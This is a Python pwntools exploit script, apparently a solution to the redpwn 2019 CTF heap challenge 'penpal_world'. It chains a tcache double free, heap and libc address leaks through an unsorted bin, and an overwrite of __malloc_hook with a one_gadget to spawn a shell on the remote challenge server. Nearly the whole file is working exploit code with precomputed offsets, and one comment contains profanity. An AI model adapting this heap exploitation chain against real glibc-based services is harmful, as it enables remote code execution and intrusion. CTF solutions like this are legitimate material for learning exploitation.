from pwn import *

host, port = "chall2.2019.redpwn.net", "4010"
filename = "./penpal_world"
elf = ELF(filename)
libc = "./libc-2.27.so"
context.arch = 'amd64'

#libc = ELF('/glibc/2.27/64/lib/libc.so.6')
if not args.REMOTE and not libc:
    libc = elf.libc#ELF('/glibc/2.27/64/lib/libc-2.27.so')
else:
    libc = ELF('./libc-2.27.so')
#rop=ROP([libc])
def getConn():
    return process(["/path/to/ld.so", filename], env={"LD_PRELOAD":"/path/to/libc.so.6"}) if not args.REMOTE else remote(host, port)

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(r)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(r,gdbscript=script)

def add(index):
    r.sendlineafter('4) Read a postcard\n',str(1))
    r.sendlineafter('Which envelope #?\n', str(index))
    #r.sendlineafter()
def edit(index, content):
    r.sendlineafter('4) Read a postcard\n',str(2))
    r.sendlineafter('Which envelope #?\n', str(index))
    r.sendafter('Write.\n', content)

def free(index):
    r.sendlineafter('4) Read a postcard\n',str(3))
    r.sendlineafter('Which envelope #?\n', str(index))
    #r.recvuntil('Command me: ')

def read(index):
    r.sendlineafter('4) Read a postcard\n',str(4))
    r.sendlineafter('Which envelope #?\n', str(index))

context.terminal = ['tmux', 'new-window']
r = getConn()
if not args.REMOTE and args.GDB:
	debug([0xb11,0x9b3])#0xb11,0x9b3]) #0x9b3 0xB11 0xa7c

####################################### LEAK FUCKING LIBC
add(0)
edit(0, b'A'*0x30 + p64(0x0)+ p64(0x51))
free(0)
free(0) # DOUBLE FREE (no security checks while in tcache at this libc version)
read(0) # LEAK HEAP
heap = u64(r.recv(6).ljust(8, '\x00'))-0x60
log.info('0x%x'%heap)
log.info('0x%x'%(heap+0x100))
edit(0,p64(heap+0x90)) # change the fd pointer to get arbitrary write with malloc
add(0) # MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -> heap+0x90 <- 0x0
add(1) # MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 <- 0x0
add(0) # NEW ALLOCATION (NO MEMORY REUSE) THIS ONE IS DONE HERE TO PREVENT MERGE WITH TOP CHUNK
edit(0, b'B'*0x30 + p64(0x0)+ p64(0x51))
edit(1,p64(0)+p64(0x91)+p64(0)+p64(0x91)) # OVERWRITES THE SIZE OF CHUNK 'B'

add(1) # TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN
edit(1,(b'C'*0x30 +p64(0x0)+p64(0x51)))
add(1) # TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN
edit(1, (b'D'*0x30+p64(0x0)+p64(0x51)))
for i in range(7): # Filling tcachebin
    free(0)
free(0) # free unsortedbin
read(0) # LEAK LIBC
l =  u64(r.recv(6).ljust(8,'\x00'))
#log.info(hex(rop.search(regs=['rdi'], order = 'regs').address))
LIBC_BASE = l-0x3ebca0
MALLOC_HOOK = LIBC_BASE+libc.symbols['__malloc_hook']
FREE_HOOK = LIBC_BASE+libc.symbols['__free_hook']
SYSTEM = LIBC_BASE+ libc.symbols['system']
BINSH = LIBC_BASE+ libc.search('/bin/sh').next()
ONE_GADGET = LIBC_BASE+0x10a38c
POPRDI = LIBC_BASE+0x2155f # pop rdi ; ret

log.info("MAIN ARENA+0x96 0x%x"%l)
log.info("LIBCBASE 0x%x"%LIBC_BASE)
log.info("ONEGADGET 0x%x"%ONE_GADGET)
log.info("MALLOC HOOK 0x%x"%MALLOC_HOOK)
log.info("FREE HOOK 0x%x"%FREE_HOOK)
log.info("SYSTEM 0x%x"%SYSTEM)
log.info("BIN_SH 0x%x"%BINSH)
log.info("POP RDI 0x%x"%POPRDI)
log.info("JUMP 0x%x"%(heap+0x150))#0x1d8b6b0))

log.info("HEAP 0x%x"%(heap)) #24
log.info("NEXT HEAP 0x%x"%(heap+0x130))
#########################################################
################################### OVERWRITE MALLOC_HOOK
free(1)
edit(1,p64(MALLOC_HOOK)) # change the address of FD to MALLOC_HOOK
add(0)
add(0) # returns the address of malloc_hook
edit(0,p64(ONE_GADGET)) # Overwrites content of malloc_hook to ONE_GADGET
add(0) # trigers malloc hook
#########################################################
r.interactive()